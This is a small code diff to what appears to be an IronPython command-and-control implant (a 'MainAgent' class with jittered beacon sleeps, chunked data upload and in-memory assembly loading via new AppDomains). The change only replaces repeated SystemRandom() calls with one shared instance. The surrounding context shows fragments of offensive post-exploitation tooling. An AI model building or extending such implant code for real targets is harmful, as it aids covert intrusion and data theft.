@@ -27,6 +27,8 @@ from os.path import expanduser
 from threading import Thread
 import hmac
 
+_sysrand = random.SystemRandom()
+
 import clr
 import secretsocks
 import System
@@ -509,7 +511,7 @@ class MainAgent:
 
                 minSleep = int((1.0 - self.jitter) * self.delay)
                 maxSleep = int((1.0 + self.jitter) * self.delay)
-                sleepTime = random.SystemRandom().randint(minSleep, maxSleep)
+                sleepTime = _sysrand.randint(minSleep, maxSleep)
                 time.sleep(sleepTime)
                 partIndex += 1
                 offset += 512000
@@ -1134,7 +1136,7 @@ class MainAgent:
 
         data = data.lstrip("\x00")
         # Generate a random name
-        rand_name = ''.join(random.SystemRandom().choice("ABCDEFGHKLMNPRSTUVWXYZ123456789") for _ in range(6))
+        rand_name = ''.join(_sysrand.choice("ABCDEFGHKLMNPRSTUVWXYZ123456789") for _ in range(6))
 
         # Create a new AppDomain
         app_domain = AppDomain.CreateDomain(rand_name)
@@ -1710,7 +1712,7 @@ class MainAgent:
                 minSleep = int((1.0 - self.jitter) * self.delay)
                 maxSleep = int((1.0 + self.jitter) * self.delay)
 
-                sleepTime = random.SystemRandom().randint(minSleep, maxSleep)
+                sleepTime = _sysrand.randint(minSleep, maxSleep)
                 time.sleep(sleepTime)
 
                 code, data = self.packet_handler.send_message()
